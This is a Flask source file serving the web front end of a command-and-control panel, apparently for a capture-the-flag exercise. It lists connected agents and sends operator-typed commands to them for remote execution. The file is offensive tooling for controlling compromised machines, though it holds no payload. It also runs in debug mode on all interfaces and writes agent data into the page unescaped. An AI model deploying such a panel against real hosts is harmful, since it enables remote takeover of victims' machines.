from flask import Flask, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>C2 Control Panel - CTF</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #0a0a0a; 
            color: #00ff41; 
            padding: 20px; 
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { 
            color: #00ff41; 
            border-bottom: 2px solid #00ff41; 
            padding-bottom: 10px; 
            margin-bottom: 20px; 
        }
        .header-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .base-url { color: #666; font-size: 14px; }
        .refresh-btn { 
            background: #333; 
            color: #00ff41; 
            border: 1px solid #00ff41; 
            padding: 5px 15px; 
            border-radius: 3px; 
            cursor: pointer; 
        }
        .refresh-btn:hover { background: #444; }
        .agent { 
            background: #1a1a1a; 
            border: 1px solid #00ff41; 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 5px; 
        }
        .agent.online { border-color: #00ff41; }
        .agent.offline { border-color: #ff0041; opacity: 0.5; }
        .agent-header {
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .agent-info {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .status { 
            display: inline-block; 
            padding: 3px 10px; 
            border-radius: 3px; 
            font-size: 12px; 
        }
        .online { background: #00ff41; color: #000; }
        .offline { background: #ff0041; color: #fff; }
        .command-input { 
            display: flex; 
            gap: 10px; 
            margin: 10px 0; 
        }
        .command-input input { 
            flex: 1; 
            background: #111; 
            border: 1px solid #00ff41; 
            color: #00ff41; 
            padding: 8px; 
            border-radius: 3px; 
        }
        .command-input button { 
            background: #00ff41; 
            color: #000; 
            border: none; 
            padding: 8px 20px; 
            border-radius: 3px; 
            cursor: pointer; 
            font-weight: bold; 
        }
        .command-input button:hover { background: #00cc33; }
        .results { 
            background: #111; 
            padding: 10px; 
            margin-top: 10px; 
            border-radius: 3px; 
            max-height: 200px; 
            overflow-y: auto; 
            white-space: pre-wrap; 
        }
        .results pre { color: #00ff41; }
        .timestamp { color: #666; font-size: 12px; }
        .clear-btn { 
            background: #ff0041; 
            color: #fff; 
            border: none; 
            padding: 5px 15px; 
            border-radius: 3px; 
            cursor: pointer; 
        }
        .clear-btn:hover { background: #cc0033; }
        .no-agents { color: #666; text-align: center; padding: 40px; }
        .last-update { color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🕵️ C2 Control Panel</h1>
        <div class="header-info">
            <div class="base-url" id="baseUrl"></div>
            <div>
                <button class="refresh-btn" onclick="refresh()">⟳ Refresh</button>
                <span class="last-update" id="lastUpdate"></span>
            </div>
        </div>
        <div id="agents">
            <div class="no-agents">En attente de connexion...</div>
        </div>
    </div>

    <script>
        const BASE_URL = window.location.origin;
        document.getElementById('baseUrl').textContent = `📡 C2 URL: ${BASE_URL}`;
        let refreshInterval;

        function refresh() {
            fetch(`${BASE_URL}/api/agents`)
                .then(r => r.json())
                .then(data => {
                    const container = document.getElementById('agents');
                    container.innerHTML = '';
                    
                    if (Object.keys(data).length === 0) {
                        container.innerHTML = '<div class="no-agents">Aucun agent connecté...</div>';
                        document.getElementById('lastUpdate').textContent = `Dernière mise à jour: ${new Date().toLocaleTimeString()}`;
                        return;
                    }
                    
                    for (const [id, agent] of Object.entries(data)) {
                        const div = document.createElement('div');
                        const isOnline = agent.last_seen && (Date.now() - new Date(agent.last_seen).getTime()) < 30000;
                        div.className = 'agent ' + (isOnline ? 'online' : 'offline');
                        
                        const resultsHtml = (agent.results || []).map(r => 
                            `[${r.time}] > ${r.output}`
                        ).join('\\n') || 'En attente de résultats...';
                        
                        div.innerHTML = `
                            <div class="agent-header">
                                <div class="agent-info">
                                    <strong>${id}</strong>
                                    <span class="status ${isOnline ? 'online' : 'offline'}">${isOnline ? '● ONLINE' : '● OFFLINE'}</span>
                                    <span class="timestamp">IP: ${agent.ip || 'N/A'} | Dernier: ${agent.last_seen || 'jamais'}</span>
                                </div>
                                <div>
                                    <button class="clear-btn" onclick="clearResults('${id}')">Clear</button>
                                </div>
                            </div>
                            <div class="command-input">
                                <input id="cmd-${id}" type="text" placeholder="Entrez une commande..." 
                                    onkeypress="if(event.key==='Enter') sendCommand('${id}')">
                                <button onclick="sendCommand('${id}')">▶ Exécuter</button>
                            </div>
                            <div class="results" id="results-${id}">
                                <pre>${resultsHtml}</pre>
                            </div>
                        `;
                        container.appendChild(div);
                    }
                    
                    document.getElementById('lastUpdate').textContent = `Dernière mise à jour: ${new Date().toLocaleTimeString()}`;
                })
                .catch(err => {
                    console.error('Erreur:', err);
                    document.getElementById('lastUpdate').textContent = '⚠️ Erreur de connexion';
                });
        }
        
        function sendCommand(agentId) {
            const input = document.getElementById(`cmd-${agentId}`);
            const command = input.value.trim();
            if (!command) return;
            
            fetch(`${BASE_URL}/api/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ agent_id: agentId, command: command })
            })
            .then(r => r.json())
            .then(() => {
                input.value = '';
                setTimeout(refresh, 500);
            })
            .catch(err => console.error('Erreur:', err));
        }
        
        function clearResults(agentId) {
            fetch(`${BASE_URL}/api/clear`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ agent_id: agentId })
            })
            .then(() => refresh())
            .catch(err => console.error('Erreur:', err));
        }
        
        // Rafraîchir toutes les 5 secondes
        refresh();
        refreshInterval = setInterval(refresh, 5000);
    </script>
</body>
</html>
"""

def handler(request):
    return app(request)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_index(path):
    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)